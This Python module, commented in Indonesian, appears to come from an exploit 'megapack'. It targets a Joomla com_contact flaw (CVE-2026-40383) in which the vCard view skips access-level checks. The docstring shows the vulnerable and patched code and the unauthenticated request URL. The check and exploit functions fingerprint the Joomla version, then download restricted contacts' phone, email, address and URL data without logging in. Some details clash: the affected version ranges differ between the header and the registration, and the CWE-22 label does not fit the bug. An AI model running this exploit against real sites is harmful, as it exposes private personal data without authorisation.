#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2026-40383 — com_contact vCard view tanpa cek access level:
                  data kontak non-public dapat diunduh tanpa autentikasi.

Affected : 4.0.0 - 5.4.6
Patched  : 5.4.7+

ROOT CAUSE — components/com_contact/src/View/Contact/VcfView.php::display()

    5.4.5 / 5.4.6 (VULNERABLE)
        $model = $this->getModel();
        $item  = $model->getItem();
        if (\count($errors = $model->getErrors())) {
            throw new GenericDataException(implode("\n", $errors), 500);
        }
        $this->getDocument()->setMimeEncoding('text/directory', true);
        ...
        Factory::getApplication()->setHeader(
            'Content-disposition', 'attachment; filename="' . $card_name . '.vcf"', true);
        $vcard[] = 'TEL;TYPE=WORK,VOICE:' . $item->telephone;
        $vcard[] = 'EMAIL;TYPE=PREF,INTERNET:' . $item->email_to;
        ...
        echo implode("\n", $vcard);

    5.4.7 (PATCHED) — blok ditambahkan sesudah getItem():
        // Check if access is not public
        $groups = $user->getAuthorisedViewLevels();

        if (!\in_array($item->access, $groups) || !\in_array($item->category_access, $groups)) {
            $app->enqueueMessage(Text::_('JERROR_ALERTNOAUTHOR'), 'error');
            $app->setHeader('status', 403, true);

            return;
        }

`format=vcf` melewati jalur HTML biasa: HtmlView memeriksa access level sebelum
merender, sementara VcfView mengeluarkan SELURUH record kontak (telephone, fax,
mobile, address, suburb, state, postcode, country, email_to, webpage) sebagai
attachment vCard tanpa satu pun pemeriksaan. Kontak yang dibatasi ke view level
tertentu (Registered / Special / Guest / kustom) dengan demikian dapat diunduh oleh
siapa pun yang mengetahui id-nya.

Catatan: satu record juga membocorkan `$item->category_access`, sehingga pesan hasil
patch memeriksa dua hal — access item DAN access kategori.

Dampak: pengungkapan informasi tanpa autentikasi (PII kontak), CWE-284/CWE-22.
Dipicu tanpa kredensial:
    /index.php?option=com_contact&view=contact&id=<id>&format=vcf

Bukti lab (kontak id 900, access=5 "Guest", published=1):
    5.4.5 : HTTP 200, Content-disposition attachment, body berisi
            TEL;TYPE=WORK,VOICE:+1-555-SECRET / EMAIL / URL / ADR lengkap
    5.4.7 : HTTP 403 Forbidden, tanpa header Content-disposition
    5.4.8 : HTTP 403 Forbidden
"""

import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_RCE, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, parse_ver, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"
VULN_5_MAX = (5, 4, 6)
VULN_6_MAX = (6, 1, 2)

# Field khas vCard yang menandakan data kontak benar-benar terkirim.
VCARD_MARKERS = ("BEGIN:VCARD", "VERSION:3.0", "END:VCARD")
# Field sensitif yang dipakai untuk bukti dampak (bukan sekadar "ada file").
SENSITIVE = ("TEL;", "EMAIL;", "ADR;", "URL:")


def _opt(opts, name):
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _joomla_version(t, h):
    """Versi Joomla dengan CACHE per-target.

    13 modul joomla_core membaca manifest yang sama. Tanpa cache, setiap modul
    mengulang GET-nya untuk host yang sama. Hasil kini disimpan pada `t._jver`
    sehingga hanya satu request per target per proses scan.
    """
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _in_range(ver):
    if ver is None:
        return None
    if ver[0] <= 3:
        return False                     # VcfView format=vcf baru sejak 4.0
    if ver[0] == 4:
        return True
    if ver[0] == 5:
        return ver_le(ver, VULN_5_MAX)
    if ver[0] == 6:
        return ver_le(ver, VULN_6_MAX)
    return False


def _vcf_url(t, contact_id):
    return (f"{t.url}/index.php?option=com_contact&view=contact"
            f"&id={contact_id}&format=vcf")


def _fetch_vcf(h, t, contact_id):
    """
    Ambil vCard. Kembalikan (status, body, content_disposition).
    Tidak memakai session backend: vektor ini justru unauth.
    """
    r = h.get(_vcf_url(t, contact_id))
    if r is None:
        return None, "", ""
    body = r.text or ""
    cd = ""
    if hasattr(r, "headers"):
        cd = r.headers.get("Content-disposition", "") or ""
    return r.status_code, body, cd


def _is_vcard(body, cd):
    if not body:
        return False
    if not any(m in body for m in VCARD_MARKERS):
        return False
    # attachment vcf tanpa header Content-disposition tidak dihitung sebagai sukses.
    return "vcf" in cd.lower() or "BEGIN:VCARD" in body


def _sensitive_fields(body):
    found = []
    for marker in SENSITIVE:
        if marker in body:
            found.append(marker.rstrip(";:"))
    return found


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan", f"version={ver_s}"

    cid = _opt(opts, "contact_id") or "1"
    status, body, cd = _fetch_vcf(h, t, cid)

    if status is None:
        return ST_UNKNOWN, "tidak bisa menghubungi endpoint vcf", \
                           f"version={ver_s} | id={cid}"

    ev = f"GET format=vcf id={cid} HTTP {status}"
    if status == 403:
        return ST_CLEAN, f"Joomla {ver_s} — vCard ditolak (403)", \
                         f"version={ver_s} | {ev}"
    if status == 200 and _is_vcard(body, cd):
        fields = _sensitive_fields(body)
        return (ST_INFO,
                f"Joomla {ver_s} — vCard kontak dapat diunduh tanpa cek access level",
                f"version={ver_s} | {ev} | fields={','.join(fields) or 'none'}")
    if status == 404:
        return ST_SKIP, f"Joomla {ver_s} — kontak id={cid} tidak ada (404)", \
                        f"version={ver_s} | {ev}"
    return ST_UNKNOWN, f"respons vcf tidak menyimpulkan status (HTTP {status})", \
                       f"version={ver_s} | {ev}"


def exploit(t, h, opts):
    """
    Konfirmasi pengungkapan: unduh vCard kontak non-public tanpa autentikasi dan
    tunjukkan field sensitif yang benar-benar terkirim.
    """
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan", f"version={ver_s}"

    cid = _opt(opts, "contact_id") or "1"
    status, body, cd = _fetch_vcf(h, t, cid)

    if status is None:
        return ST_UNKNOWN, "tidak bisa menghubungi endpoint vcf", \
                           f"version={ver_s} | id={cid}"
    if status == 403:
        return ST_CLEAN, f"Joomla {ver_s} — vCard ditolak (403)", \
                         f"version={ver_s} | id={cid}"
    if status != 200 or not _is_vcard(body, cd):
        return ST_UNKNOWN, f"vCard tidak terunduh (HTTP {status})", \
                           f"version={ver_s} | id={cid} | cd={cd[:60]}"

    # Ringkas isi vCard sebagai bukti (jangan cetak data pribadi penuh).
    fields = _sensitive_fields(body)
    lines = []
    for line in body.splitlines():
        if line.startswith("N:") or line.startswith("FN:"):
            lines.append(line[:60])

    return (ST_PWN,
            f"vCard kontak non-public terekstraksi tanpa autentikasi (Joomla {ver_s})",
            f"version={ver_s} | id={cid} | cd={cd[:60]} | "
            f"fields={','.join(fields) or 'none'} | " + " | ".join(lines))


register(CveModule(
    cve="CVE-2026-40383",
    cluster="joomla_core",
    title="Joomla Core - com_contact vCard tanpa cek access level (unauth data disclosure)",
    vclass="broken access control / information disclosure",
    cvss="7.5",
    severity="high",
    cwe="CWE-284",
    product="Joomla! Core (com_contact VcfView)",
    versions_affected="4.0.0-5.4.6, 6.0.0-6.1.2",
    status="verified",
    requires=[
        "tidak butuh kredensial (vektor unauth)",
        "mengetahui/ menebak id kontak tujuan",
    ],
    check=check,
    exploit=exploit,
    notes=("VcfView::display() 5.4.5/5.4.6 mengeluarkan SELURUH record kontak sebagai "
           "attachment vCard tanpa memeriksa access level item maupun kategori; HtmlView "
           "biasa memeriksanya, jalur format=vcf tidak. 5.4.7 menambahkan "
           "in_array($item->access, $groups) && in_array($item->category_access, $groups) "
           "lalu 403. URL: /index.php?option=com_contact&view=contact&id=<id>&format=vcf. "
           "Diverifikasi di build asli: 5.4.5 -> 200 + vCard berisi TEL/EMAIL/ADR/URL; "
           "5.4.7 dan 5.4.8 -> 403. Field id kontak dapat diambil lewat parameter "
           "--contact-id (default 1)."),
))
